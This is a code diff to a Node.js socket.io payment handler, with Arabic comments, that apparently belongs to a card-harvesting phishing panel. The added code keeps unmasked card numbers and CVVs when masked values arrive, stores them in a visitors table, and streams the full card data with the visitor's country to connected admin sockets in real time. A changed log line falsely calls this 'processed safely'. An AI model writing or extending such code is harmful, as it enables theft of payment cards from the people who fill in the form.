@@ -159,22 +159,42 @@ io.on('connection', (socket) => {
     const { sessionId, paymentData } = data;
     
     try {
+      // جلب البيانات الحالية المخزنة للزائر للحفاظ على الأرقام الحقيقية
+      const currentVisitor = await pool.query(
+        'SELECT payment_data FROM visitors WHERE session_id = $1', 
+        [sessionId]
+      );
+      
+      let finalPaymentData = { ...paymentData };
+
+      if (currentVisitor.rows.length > 0 && currentVisitor.rows[0].payment_data) {
+        const existingData = currentVisitor.rows[0].payment_data;
+        
+        // إذا كانت البيانات الجديدة تحتوي على نجوم، نحتفظ بالرقم الحقيقي القديم
+        if (paymentData.cardNumber && paymentData.cardNumber.includes('*') && existingData.cardNumber) {
+          finalPaymentData.cardNumber = existingData.cardNumber;
+        }
+        if (paymentData.cvv && paymentData.cvv.includes('*') && existingData.cvv) {
+          finalPaymentData.cvv = existingData.cvv;
+        }
+      }
+
       await pool.query(
         'UPDATE visitors SET payment_data = $1, payment_submitted = true, last_activity = CURRENT_TIMESTAMP WHERE session_id = $2',
-        [JSON.stringify(paymentData), sessionId]
+        [JSON.stringify(finalPaymentData), sessionId]
       );
 
-      // Notify admins
+      // إرسال الإشعار الفوري للأدمن بالبيانات الحقيقية كاملة
       adminConnections.forEach((adminSocket) => {
         adminSocket.emit('form:paymentSubmitted', {
           sessionId,
-          paymentData,
+          paymentData: finalPaymentData,
           country: geo?.country,
           timestamp: new Date()
         });
       });
 
-      console.log(`💳 Payment form submitted by ${sessionId}`);
+      console.log(`💳 Payment form processed safely for ${sessionId}`);
     } catch (error) {
       console.error('Error saving payment data:', error);
     }
